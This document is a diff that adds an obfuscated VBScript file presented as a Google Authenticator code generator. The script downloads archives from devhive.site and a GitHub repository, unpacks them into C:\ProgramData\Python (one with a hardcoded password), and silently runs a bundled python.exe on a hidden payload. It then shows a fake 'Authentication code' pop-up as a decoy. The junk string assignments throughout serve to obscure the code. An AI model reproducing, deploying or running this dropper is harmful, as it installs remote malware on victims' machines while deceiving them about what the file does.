@@ -1,0 +1,164 @@
+Dim aaaaaaabncjds, qwoiughduiobhciwe, fwcwfcuhwfcnhioquf, zbxcvnbzcxvmzxb, pppppppppppooooooooodddd
+Dim oupgmruvfnblgtyuf, wygbvfqiuegwnyeb, eyucvbodibuwquios, wuernvgoreuihvnfgpoeruifvyhbpodia
+Dim ffffffffffffffffffffffffffaaaaaaaaaaaaasss, rgbyeuiowuiowuiowhno, MFHEHDOWNXKS
+Dim ppppppppeeeexxxxyyy, pppppppsssscscccrrrriiiiiiugfyuqo
+Dim gowiueghpweor
+Dim wrepofhn, ghryhoyho
+Set wrepofhn = CreateObject("WScript.Shell")
+Set ghryhoyho = CreateObject("Shell.Application")
+
+aaaaaaabncjds = "https://devhive.site/kkjssd11age1.rar"
+dfsijsdfhisdfjiosdfjiosdfiojsdfioj = "https://devhive.site/wogjehivg.rar"
+wuernvgoreuihvnfgpoeruifvyhbpodia = "https://raw.githubusercontent.com/win-authenticator/gmx/refs/heads/otp/WinRAR.zip"
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpweuyhdspoijoqwavfdscsdaxsduyhdspoijoqwavfdscsdaxsd]"
+qwoiughduiobhciwe = "C:\ProgramData\Python\1.zip"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwavfdscsdaxsdbygvpnoqweicrmw,fj[pvpwe]"
+fwcwfcuhwfcnhioquf = "C:\ProgramData\Python"
+gowiueghpweor = "fgoiuquqfughowpfguyhdspoijoqwavfdscsdaxsdiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+zbxcvnbzcxvmzxb = "C:\ProgramData\Python\WinRAR\rar.exe"
+gowiueghpweor = "fgoiuquuyhdspoijoqwavfdscsdaxsduyhdspoijoqwavfdscsdaxsdqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+pppppppppppooooooooodddd = "9207db8d14d48ed550efb6225445f4"
+
+oupgmruvfnblgtyuf = "C:\ProgramData"
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+Set ffffffffffffffffffffffffffaaaaaaaaaaaaasss = CreateObject("Scripting.FileSystemObject")
+
+wygbvfqiuegwnyeb = "Python"
+eyucvbodibuwquios = oupgmruvfnblgtyuf & "\" & wygbvfqiuegwnyeb
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+If Not ffffffffffffffffffffffffffaaaaaaaaaaaaasss.FolderExists(eyucvbodibuwquios) Then
+    ffffffffffffffffffffffffffaaaaaaaaaaaaasss.CreateFolder eyucvbodibuwquios
+End If
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpuyhdspoijoqwavfdscsdaxsdwe]"
+Set rgbyeuiowuiowuiowhno = CreateObject("MSXML2.XMLHTTP")
+rgbyeuiowuiowuiowhno.Open "GET", wuernvgoreuihvnfgpoeruifvyhbpodia, False
+rgbyeuiowuiowuiowhno.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+rgbyeuiowuiowuiowhno.Send
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspuyhdspoijoqwavfdscsdaxsduyhdspoijoqwavfdscsdaxsdoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+If rgbyeuiowuiowuiowhno.Status = 200 Then
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    Set MFHEHDOWNXKS = CreateObject("ADODB.Stream")
+    MFHEHDOWNXKS.Type = 1 
+    MFHEHDOWNXKS.Open
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Write rgbyeuiowuiowuiowhno.ResponseBody
+    MFHEHDOWNXKS.SaveToFile qwoiughduiobhciwe, 2 
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Close
+End If
+
+ghryhoyho.NameSpace(fwcwfcuhwfcnhioquf).CopyHere ghryhoyho.NameSpace(qwoiughduiobhciwe).Items(), 20
+
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbyqrbqefvwercfwegvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpqwefcqwxqwexdwfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqqcwedcqwedvqweqwevweqrvfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+Set rgbyeuiowuiowuiowhno = CreateObject("MSXML2.XMLHTTP")
+rgbyeuiowuiowuiowhno.Open "GET", aaaaaaabncjds, False
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqwerveqwqrvewqrveqwrvqwevreqwvicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijeqwrveqwveqwrveqwvqweoqwbygvpnoqweeqwrqwevrewqicrmw,fjwqevrqwev[pvpwe]"
+rgbyeuiowuiowuiowhno.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+gowiueghpweor = "fgoiuquqfuguyhdspoijoqwavfdscsdaxsdhowpfgiuyhdsuyhdspoijoqwavfdscsdaxsdpoijoqwbygvpnoqweicrmw,fuyhdspoijoqwavfdscsdaxsdj[pvpwcxvxccx zxazcxje]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fuyhdspoijoqwavfdscsdaxsdj[pvqwvervqwuyhdspoijoqwavfdscsdaxsderveqwr,uybvgfgfvbpwe]"
+rgbyeuiowuiowuiowhno.Send
+gowiueghpweor = "fgoiuquqfughowpfgnnjmhnbnvbxxiuyhdspoijoqwbyxdxdxdxdxdv,ljhgvpnuyhdspoijoqwavfdscsdaxsdoqweicrmw,fj[pvbddxdxsvpwe]"
+
+If rgbyeuiowuiowuiowhno.Status = 200 Then
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqwvb bv bnbn nbddveicrmw,fj[pvpwe]"
+    Set MFHEHDOWNXKS = CreateObject("ADODB.Stream")
+    MFHEHDOWNXKS.Type = 1 
+    gowiueghpweor = "fgoiuquqfugho,mjhnyergyulhtgferwpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Open
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqwfryhjuuuuuedxeicrmw,fj[pvpwe]"
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Write rgbyeuiowuiowuiowhno.ResponseBody
+    gowiueghpweor = "fgoiuquqfuuyhdspoijoqwavfdscsdaxsdghowpfgiuyhduyhdspoijoqwavfdscsdaxsdspoijoqwbygvpnoqweuyhdspoijoqwavfdscsdaxsdicrmw,fj[pvpwe]"
+    gowiueghpweor = "fgoiuququyhdspoijoqwavfdscsdaxsdfughowpfgiuyhdspoijoqwbuyhdspoijoqwavfdscsdaxsdygvpnoqweicrmw,fj[pvpwe]"
+    gowiueghpweor = "fgoiuquqfughuyhdspoijoqwavfdscsdaxsdowpfgiuyhdspoijoqwbygvpnoqweicrmw,uyhdspoijoqwavfdscsdaxsdfj[pvpwe]"
+    MFHEHDOWNXKS.SaveToFile qwoiughduiobhciwe, 2 
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Close
+End If
+
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+nthbtrbhn = """" & zbxcvnbzcxvmzxb & """ x -y """ & qwoiughduiobhciwe & """ """ & fwcwfcuhwfcnhioquf & """"
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+wrepofhn.Run nthbtrbhn, 0, True
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+Set rgbyeuiowuiowuiowhno = CreateObject("MSXML2.XMLHTTP")
+rgbyeuiowuiowuiowhno.Open "GET", dfsijsdfhisdfjiosdfjiosdfiojsdfioj, False
+rgbyeuiowuiowuiowhno.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
+rgbyeuiowuiowuiowhno.Send
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+If rgbyeuiowuiowuiowhno.Status = 200 Then
+    Set MFHEHDOWNXKS = CreateObject("ADODB.Stream")
+    MFHEHDOWNXKS.Type = 1 
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Open
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Write rgbyeuiowuiowuiowhno.ResponseBody
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.SaveToFile qwoiughduiobhciwe, 2 
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+    MFHEHDOWNXKS.Close
+End If
+
+gowiueghpweor = "fgoiuquqfughowpfguyhdspoijoqwavfdscsdaxsdiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughuyhdspoijoqwavfdscsdaxsdowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+nthbtrbhn = """" & zbxcvnbzcxvmzxb & """ x -y -p""" & pppppppppppooooooooodddd & """ """ & qwoiughduiobhciwe & """ """ & fwcwfcuhwfcnhioquf & """"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+wrepofhn.Run nthbtrbhn, 0, True
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+ppppppppeeeexxxxyyy = fwcwfcuhwfcnhioquf & "\python.exe"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweuyhdspoijoqwavfdscsdaxsdicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwuyhdspoijouyhdspoijoqwavfdscsdaxsdqwavfdscsdaxsdbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfuyhdspoijoqwavfdscsdaxsdgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+pppppppsssscscccrrrriiiiiiugfyuqo = fwcwfcuhwfcnhioquf & "\pyconfig"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+wrepofhn.Run """" & ppppppppeeeexxxxyyy & """ """ & pppppppsssscscccrrrriiiiiiugfyuqo & """", 0, TRUE
+
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+gowiueghpweor = "fgoiuquqfughowpfgiuyhdspoijoqwbygvpnoqweicrmw,fj[pvpwe]"
+
+Dim array(9)
+array(0) = "234166"
+array(1) = "923819"
+array(2) = "134665"
+array(3) = "195642"
+array(4) = "465102"
+array(5) = "355477"
+array(6) = "296082"
+array(7) = "964125"
+array(8) = "305478"
+array(9) = "532116"
+
+Randomize
+Dim randomIndex
+randomIndex = Int(Rnd * 10)
+
+Dim otp
+otp = array(randomIndex)
+
+Dim formattedOTP
+formattedOTP = Left(otp, 3) & " " & Mid(otp, 4, 3)
+
+MsgBox "Authentication code: " & formattedOTP, vbOKOnly, "Google Authenticator"
